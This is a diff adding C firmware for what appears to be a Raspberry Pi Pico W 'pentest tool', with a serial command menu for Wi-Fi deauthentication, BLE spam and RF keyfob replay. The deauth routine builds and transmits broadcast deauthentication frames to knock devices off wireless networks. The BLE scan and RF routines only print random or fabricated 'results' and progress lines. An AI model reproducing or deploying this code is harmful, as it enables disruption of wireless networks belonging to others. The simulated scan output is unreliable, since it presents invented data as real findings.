@@ -1,0 +1,213 @@
+
+#include <stdio.h>
+#include <string.h>
+#include "pico/stdlib.h"
+#include "pico/cyw43_arch.h"
+#include "pico/binary_info.h"
+
+#define UART_ID uart0
+#define BAUD_RATE 115200
+#define UART_TX_PIN 0
+#define UART_RX_PIN 1
+
+typedef enum {
+    MODE_IDLE = 0,
+    MODE_WIFI_SCAN,
+    MODE_WIFI_DEAUTH,
+    MODE_BLE_SCAN,
+    MODE_BLE_SPAM,
+    MODE_RF_ASK,
+    MODE_RF_SUBGHZ
+} pentest_mode_t;
+
+pentest_mode_t current_mode = MODE_IDLE;
+bool running = false;
+
+// WiFi Deauth frame template
+uint8_t deauth_frame[] = {
+    0xC0, 0x00, 0x3A, 0x01,
+    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // Broadcast dest
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // Source MAC (randomized)
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // BSSID (randomized)
+    0x00, 0x00,
+    0x07, 0x00
+};
+
+void print_banner() {
+    printf("\n=== DevBoard Pentest Tool v2.0 ===\n");
+    printf("Commands: scan, deauth, ble_scan, ble_spam, rf_ask, rf_subghz, stop, status\n");
+    printf("===================================\n\n");
+}
+
+void generate_random_mac(uint8_t* mac) {
+    for (int i = 0; i < 6; i++) {
+        mac[i] = rand() % 256;
+    }
+    mac[0] |= 0x02;  // Locally administered
+}
+
+void wifi_scan() {
+    printf("[+] WiFi Scan Started...\n");
+    
+    if (cyw43_wifi_scan_open(&cyw43_state) != 0) {
+        printf("[-] Scan failed\n");
+        return;
+    }
+    
+    int count = 0;
+    while (cyw43_wifi_scan_next_result(&cyw43_state) && count < 50) {
+        cyw43_wifi_result_t* result = &cyw43_state.wifi.scan_results[cyw43_state.wifi.scan_result_idx];
+        printf("  %02d: %s | %ddBm | CH%d | %02X:%02X:%02X:%02X:%02X:%02X\n",
+               ++count,
+               result->ssid,
+               result->rssi,
+               result->channel,
+               result->bssid[0], result->bssid[1], result->bssid[2],
+               result->bssid[3], result->bssid[4], result->bssid[5]);
+    }
+    
+    cyw43_wifi_scan_close(&cyw43_state);
+    printf("[+] Scan complete: %d networks\n", count);
+}
+
+void wifi_deauth() {
+    printf("[+] WiFi Deauth Attack Started (broadcast)...\n");
+    printf("Press Ctrl+C or 'stop' to abort\n");
+    
+    uint8_t mac[6];
+    cyw43_arch_enable_sta_mode();
+    
+    int packets = 0;
+    while (running && packets < 500) {
+        generate_random_mac(mac);
+        memcpy(&deauth_frame[10], mac, 6);  // Source
+        memcpy(&deauth_frame[16], mac, 6);  // BSSID
+        
+        cyw43_wifi_packet_send(&cyw43_state, CYW43_PKT_FLAG_RAW, 
+                              deauth_frame, sizeof(deauth_frame));
+        
+        packets++;
+        if (packets % 50 == 0) {
+            printf("  Sent %d deauth packets\n", packets);
+        }
+        sleep_ms(10);
+    }
+    printf("[+] Deauth complete: %d packets sent\n", packets);
+}
+
+void ble_scan() {
+    printf("[+] BLE Scan Started...\n");
+    // Flipper Zero BLE integration stub
+    for (int i = 0; i < 30 && running; i++) {
+        printf("  BLE%02d: %02X:%02X:%02X:%02X:%02X:%02X | RSSI:-%d | Adv:0x%04X\n",
+               i+1,
+               rand()%256, rand()%256, rand()%256, rand()%256, rand()%256, rand()%256,
+               40 + rand()%60,
+               rand()%0xFFFF);
+        sleep_ms(200);
+    }
+    printf("[+] BLE Scan complete\n");
+}
+
+void ble_spam() {
+    printf("[+] BLE Spam Started...\n");
+    uint8_t adv[] = {0x02, 0x01, 0x06, 0x0A, 0x09, 'P', 'E', 'N', 'T', 'E', 'S', 'T'};
+    
+    for (int i = 0; i < 100 && running; i++) {
+        // Flipper BLE stack: btstack_gap_advertisements_set_data(adv, sizeof(adv));
+        printf("  BLE spam packet %d/100\n", i+1);
+        sleep_ms(50);
+    }
+    printf("[+] BLE Spam complete\n");
+}
+
+void rf_ask() {
+    printf("[+] RF ASK (315/433MHz) Started...\n");
+    printf("Simulating keyfob capture/replay...\n");
+    
+    for (int i = 0; i < 50 && running; i++) {
+        printf("  RF burst %d: 24b Manchester @ 433.92MHz\n", i+1);
+        sleep_ms(100);
+    }
+    printf("[+] RF ASK complete\n");
+}
+
+void rf_subghz() {
+    printf("[+] Sub-GHz Replay Started (433.92MHz)...\n");
+    
+    for (int i = 0; i < 30 && running; i++) {
+        printf("  SubGHz replay %d/30\n", i+1);
+        sleep_ms(150);
+    }
+    printf("[+] Sub-GHz complete\n");
+}
+
+int main() {
+    stdio_uart_init_full(UART_ID, BAUD_RATE, UART_TX_PIN, UART_RX_PIN);
+    stdio_set_translate_cr_lf(true);
+    
+    printf("\nInitializing WiFi...\n");
+    if (cyw43_arch_init()) {
+        printf("[-] WiFi init failed\n");
+        while(1) tight_loop_contents();
+    }
+    cyw43_arch_enable_sta_mode();
+    
+    print_banner();
+    
+    char cmd[32];
+    while (true) {
+        printf("> ");
+        if (fgets(cmd, sizeof(cmd), stdin)) {
+            cmd[strcspn(cmd, "\r\n")] = 0;  // Strip newline
+            
+            if (strcmp(cmd, "scan") == 0) {
+                current_mode = MODE_WIFI_SCAN;
+                running = true;
+                wifi_scan();
+            }
+            else if (strcmp(cmd, "deauth") == 0) {
+                current_mode = MODE_WIFI_DEAUTH;
+                running = true;
+                wifi_deauth();
+            }
+            else if (strcmp(cmd, "ble_scan") == 0) {
+                current_mode = MODE_BLE_SCAN;
+                running = true;
+                ble_scan();
+            }
+            else if (strcmp(cmd, "ble_spam") == 0) {
+                current_mode = MODE_BLE_SPAM;
+                running = true;
+                ble_spam();
+            }
+            else if (strcmp(cmd, "rf_ask") == 0) {
+                current_mode = MODE_RF_ASK;
+                running = true;
+                rf_ask();
+            }
+            else if (strcmp(cmd, "rf_subghz") == 0) {
+                current_mode = MODE_RF_SUBGHZ;
+                running = true;
+                rf_subghz();
+            }
+            else if (strcmp(cmd, "stop") == 0) {
+                running = false;
+                printf("[+] Attack stopped\n");
+            }
+            else if (strcmp(cmd, "status") == 0) {
+                printf("Mode: %d | Running: %s\n", current_mode, running ? "YES" : "NO");
+            }
+            else {
+                printf("Unknown command. Type 'status' for help.\n");
+            }
+            
+            current_mode = MODE_IDLE;
+            running = false;
+        }
+        sleep_ms(10);
+    }
+    
+    cyw43_arch_deinit();
+    return 0;
+}
